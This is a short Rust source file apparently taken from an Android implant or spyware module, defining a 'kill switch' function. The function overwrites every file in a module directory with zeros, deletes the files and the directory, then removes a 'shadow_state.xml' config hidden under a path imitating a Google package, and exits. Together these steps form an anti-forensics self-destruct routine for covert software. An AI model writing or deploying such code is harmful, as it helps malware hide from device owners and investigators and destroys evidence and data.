use anyhow::Result;
use std::io::Write;
use std::path::PathBuf;
use tracing::info;
use tokio::fs;

pub async fn execute_kill_switch(module_dir: PathBuf) -> Result<()> {
    info!("KILL SWITCH ACTIVATED. Commencing scrub.");

    if module_dir.exists() {
        let mut entries = fs::read_dir(&module_dir).await?;
        while let Some(entry) = entries.next_entry().await? {
            let path = entry.path();
            let metadata = entry.metadata().await?;
            if metadata.is_file() {
                if let Ok(mut file) = std::fs::OpenOptions::new().write(true).open(&path) {
                    let zeros = vec![0u8; metadata.len() as usize];
                    let _ = file.write_all(&zeros);
                    let _ = file.sync_all();
                }
                let _ = fs::remove_file(&path).await;
            }
        }
        let _ = fs::remove_dir_all(&module_dir).await;
    }

    let config_path = PathBuf::from(
        "/data/data/com.google.android.contactsync/shared_prefs/shadow_state.xml",
    );
    if config_path.exists() {
        let _ = fs::remove_file(&config_path).await;
    }

    info!("Scrub complete. Exiting process.");
    std::process::exit(0);
}
